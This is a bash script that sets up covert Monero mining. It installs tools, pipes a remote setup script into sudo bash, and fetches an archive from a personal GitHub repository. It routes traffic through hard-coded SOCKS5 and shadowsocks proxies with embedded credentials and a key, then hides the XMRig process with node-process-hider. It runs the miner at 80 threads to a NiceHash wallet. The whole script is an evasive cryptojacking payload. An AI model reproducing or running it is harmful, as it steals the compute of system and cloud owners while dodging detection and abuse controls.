#!/bin/bash
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xf xmrig-6.17.0-linux-x64.tar.gz&
cd xmrig-6.17.0

apt -y install shadowsocks-libev rng-tools

ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &

ph add xmrig

sudo ./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -a RandomX -u 3N1RwEHovNy73zLvAYxVPNf8JeyfodCPiV.TEST --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive socks5://192.252.211.197:14921
